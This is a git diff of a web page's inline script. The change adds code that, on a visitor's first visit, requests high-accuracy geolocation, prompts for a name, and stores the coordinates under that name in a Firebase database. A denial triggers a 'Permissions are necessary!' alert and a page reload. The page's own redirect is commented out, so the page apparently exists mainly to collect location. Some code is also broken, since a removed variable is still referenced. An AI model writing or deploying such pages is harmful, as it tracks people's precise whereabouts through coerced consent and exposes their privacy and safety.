@@ -24,68 +24,61 @@
     <h1>Pc : </h1><a href="pc.html">Pc</a><br>
     <script>
         database = firebase.database()
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(function (position) {
-                var latitude = position.coords.latitude;
-                var longitude = position.coords.longitude;
-                console.log("Latitude: " + latitude + ", Longitude: " + longitude);
-                var userName = prompt("Please enter your name:");
-                if (userName) {
-                    console.log("Hello, " + userName + "!");
-                    database.ref('V4/Location/'+userName).update({
-                        latitude: latitude,
-                        longitude: longitude
-                    });
-                }else {
-                    console.log("You did not enter your name.");
-                }
-            },function (error) {
-                console.error("Error getting location: " + error.message);
-            }, { enableHighAccuracy: true });
-        }else {
-            console.log("Geolocation is not available in this browser.");
-        }
-        
-            
-        var a = String(navigator.userAgent).toString()
-        account = 'a'
-        c = String(navigator.userAgent)
-        let b = c.replace(/[/().;: ]/g, "");
-        console.log(b)
-        view = 0
-        var gameStateRef  = database.ref('V4/'+b+'/');
-            gameStateRef.on("value",function(data){
-            account = data.val();
-        });
-        var gameStateRef  = database.ref('V4/view');
-            gameStateRef.on("value",function(data){
-            view = data.val();
-        });
-        
-        check1 = true
-        setInterval(check, 500)
-        function check(){
-            if(account == 'a'){}
-            else if(check1){
-                check1 = false
-                if(account == null){
-                    console.log(a)
-                    database.ref('V4/'+b+'/').update({
-                        a:true
-                    });
-                    view += 1
-                    database.ref('V4').update({
-                        view:view
-                    });
-                    console.log('updated')
-                    console.log(account)
-                    redirect()
-                }
-                else{
-                    console.log(account)
-                    redirect()
-                }
+        function setCookie(name,value,days) {
+            var expires = "";
+            if (days) {
+                var date = new Date();
+                date.setTime(date.getTime() + (days*24*60*60*1000));
+                expires = "; expires=" + date.toUTCString();
             }
+            console.log(name + "=" + (value || "")  + expires + "; path=/")
+            document.cookie = name + "=" + (value || "")  + expires + "; path=/";
+        }
+        function getCookie(name) {
+            var nameEQ = name + "=";
+            var ca = document.cookie.split(';');
+            for(var i=0;i < ca.length;i++) {
+                var c = ca[i];
+                while (c.charAt(0)==' ') c = c.substring(1,c.length);
+                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+            }
+            return null;
+        }
+        var a = String(navigator.userAgent).toString()
+        if(getCookie('old1') == null){
+            setCookie('old1', 1, 365)
+            var gameStateRef  = database.ref('V4/view');
+            gameStateRef.once("value",function(data){
+                view1 = data.val()
+                view1 +=1
+                database.ref('V4').update({
+                    view:view1
+                });
+            });
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(function (position) {
+                        var latitude = position.coords.latitude;
+                        var longitude = position.coords.longitude;
+                        console.log("Latitude: " + latitude + ", Longitude: " + longitude);
+                        var userName = prompt("Please enter your name:");
+                        if (userName) {
+                            console.log("Hello, " + userName + "!");
+                            database.ref('V4/Location/'+userName).update({
+                                latitude: latitude,
+                                longitude: longitude
+                            });
+                            redirect();
+                        }else {
+                            console.log("You did not enter your name.");
+                        }
+                    },function (error) {
+                        alert('Permissions are necessary!')
+                        window.open('#', '_top')
+                        console.error("Error getting location: " + error.message);
+                    }, { enableHighAccuracy: true });
+                }else {
+                    console.log("Geolocation is not available in this browser.");
+                }
         }
         function redirect(){
             if (a.includes('Android') || a.includes('webOS') || a.includes('iPhone') || a.includes('iPad') || a.includes('iPod') || a.includes('BlackBerry') || a.includes('Windows Phone')){
@@ -96,12 +89,12 @@
             }
             console.log(b)
             document.getElementsByTagName('h1')[0].innerHTML = a
-            if(b){
-                window.open('mobile.html', '_top')
-            }
-            else{
-                window.open('pc.html', '_top')
-            }
+            // if(b){
+            //     window.open('mobile.html', '_top')
+            // }
+            // else{
+            //     window.open('pc.html', '_top')
+            // }
         }
     </script>
 </body>
